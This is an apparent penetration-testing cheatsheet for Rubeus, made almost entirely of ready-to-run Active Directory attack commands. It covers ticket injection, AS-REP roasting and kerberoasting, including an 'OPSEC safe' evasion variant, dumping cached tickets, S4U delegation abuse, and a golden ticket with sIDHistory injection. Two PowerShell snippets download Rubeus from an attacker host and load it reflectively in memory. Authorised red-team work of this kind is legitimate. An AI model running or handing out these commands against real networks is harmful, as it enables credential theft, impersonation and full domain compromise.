# rubeus

% ad, windows, rubeus

## inject ticket from file
#plateform/windows #target/local #cat/UTILS  
```cmd
.\Rubeus.exe ptt /ticket:<ticket>
```

## load rubeus from powershell
#plateform/windows #target/local #cat/UTILS 
```powershell
$data = (New-Object System.Net.WebClient).DownloadData('http://<lhost>/Rubeus.exe');$assem = [System.Reflection.Assembly]::Load($data);
```

## execute rubeus from powershell
#plateform/windows #target/remote #cat/UTILS 
```powershell
[Rubeus.Program]::MainString("klist");
```

## monitor
#plateform/windows #target/remote #cat/ATTACK/EXPLOIT  
```cmd
.\Rubeus.exe monitor /interval:5 /filteruser:<machine_account>
```

## inject ticket from b64 blob
#plateform/windows #target/local #cat/UTILS  
```cmd
.\Rubeus.exe ptt /ticket:<BASE64BLOBHERE>
```

## check ASPREPRoast for all users in current domain
#plateform/windows #target/remote #cat/ATTACK/EXPLOIT  
```cmd
.\Rubeus.exe asreproast  /format:<AS_REP_response_format|hashcat> /outfile:<output_hashes_file>
```

## ASREPRoast specific user
#plateform/windows #target/remote #cat/ATTACK/EXPLOIT  
```cmd
.\Rubeus.exe asreproast  /user:<user> /domain:<domain> /format:<AS_REP_response_format|hashcat> /outfile:<output_hashes_file>
```

## kerberoasting - current domain
#plateform/windows #target/remote #cat/ATTACK/EXPLOIT  
```cmd
.\Rubeus.exe kerberoast /outfile:<output_TGSs_file>
```

## Kerberoasting and outputting on a file with a spesific format
#plateform/windows #target/remote #cat/ATTACK/EXPLOIT  
```cmd
.\Rubeus.exe kerberoast /outfile:<output_TGSs_file> /domain:<domain>
```

## Kerberoasting while being "OPSEC" safe, essentially while not try to roast AES enabled accounts
#plateform/windows #target/remote #cat/ATTACK/EXPLOIT  
```cmd
.\Rubeus.exe kerberoast /outfile:<output_TGSs_file> /domain:<domain> /rc4opsec
```

## Kerberoast AES enabled accounts
#plateform/windows #target/remote #cat/ATTACK/EXPLOIT  
```cmd
.\Rubeus.exe kerberoast /outfile:<output_TGSs_file> /domain:<domain> /aes
```
 
## Kerberoast specific user account
#plateform/windows #target/remote #cat/ATTACK/EXPLOIT  
```cmd
.\Rubeus.exe kerberoast /outfile:<output_TGSs_file> /domain:<domain> /user:<user> /simple
```

## get hash
#plateform/windows #target/remote #cat/POSTEXPLOIT/CREDS_RECOVER 
```cmd
.\Rubeus.exe hash /user:<user> /domain:<domain> /password:<password>
```

## dump - will dump any relevant cached TGS ticket’s stored
#plateform/windows #target/local #cat/POSTEXPLOIT/CREDS_RECOVER 
```
.\Rubeus.exe dump
```

## ask and inject ticket
#plateform/windows #target/remote #cat/ATTACK/CONNECT 
```
.\Rubeus.exe asktgt /user:<user> /domain:<domain> /rc4:<ntlm_hash> /ptt
```

## S4U - with ticket - Constrained delegation
#plateform/windows #target/remote #cat/ATTACK/EXPLOIT 
```
.\Rubeus.exe s4u /ticket:<ticket> /impersonateuser:<user> /msdsspn:ldap/<domain_fqdn> /altservice:cifs /ptt
```

## S4U - with hash - Constrained delegation
#plateform/windows #target/remote #cat/ATTACK/EXPLOIT 
```
.\Rubeus.exe s4u /user:<user> /rc4:<NTLMhashedPasswordOfTheUser> /impersonateuser:<user_to_impersonate> /msdsspn:ldap/<domain_fqdn> /altservice:cifs /domain:<domain> /ptt
```

## get rc4 of machine with the password
#plateform/windows #target/local #cat/POSTEXPLOIT/CREDS_RECOVER 
```
.\Rubeus.exe hash /password:<machine_password>
```

## S4U - Resource based constrained delegation
#plateform/windows #target/remote #cat/ATTACK/EXPLOIT 
```
.\Rubeus.exe s4u /user:<MachineAccountName> /rc4:<RC4HashOfMachineAccountPassword> /impersonateuser:<user_to_impersonate> /msdsspn:cifs/<domain_fqdn> /domain:<domain> /ptt
```

## Rubeus Reflection assembly
#plateform/windows #target/remote #cat/ATTACK/EXPLOIT 
```powershell
$data = (New-Object System.Net.WebClient).DownloadData('http://<ip>/Rubeus.exe')  
$assem = [System.Reflection.Assembly]::Load($data)
[Rubeus.Program]::Main("<rubeus_cmd>".Split())
```

## Rubeus - sIDHistory injection
#plateform/windows #target/remote #cat/ATTACK/EXPLOIT 
```powershell
.\Rubeus.exe golden /rc4:<krbtgt_hash> /domain:<child_domain> /sid:<child_sid> /sids:<sid_ets_admin> /user:<name> /ptt

```


